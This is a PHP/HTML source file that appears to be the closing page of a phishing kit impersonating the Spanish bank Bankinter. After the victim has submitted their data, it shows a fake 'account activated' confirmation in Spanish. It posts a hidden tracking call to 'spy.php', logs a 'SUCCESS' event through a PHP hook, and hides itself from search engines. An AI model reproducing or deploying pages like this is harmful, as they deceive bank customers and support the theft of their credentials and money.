<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title>Acceso clientes banca online | Bankinter</title><link href="inc/favicon.ico" type="text/css" rel="shortcut icon">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<meta name="robots" content="nofollow, noindex">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="inc/bs.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700,800" />
<link rel="stylesheet" href="inc/style.css">
<script src="inc/jq.js"></script>
</head>
<body>
<header class="headrow">

<div class="col-logo">
<img src="inc/logo_bk.svg" class="logo">
</div>
<div class="col-menu">
<i class="fa fa-bars"></i>
</div>
</header>
<div class="container">
<div class="title">CUENTA ACTIVADA !</div>
 
<div class="form bg-white">
<div class="form-group text-center">
<p>Su cuenta ha sido activada exitosamente</p>
<img src="inc/valid.gif" style="width:60px; margin:10px 0;">
<span class="form-label">Hemos confirmado que su información es correcta.</span>
</div>
 
</div>

<div class="form-grou">
<button class="btn btn-success w-100" onclick="window.location='out.php';">MI CUENTA</button>
</div>

</div>
</div>




<script>
 
 $.post("spy.php",{finishview:1});
</script>
<?php
$j->ctr("SUCCESS");
?>
</body>
</html>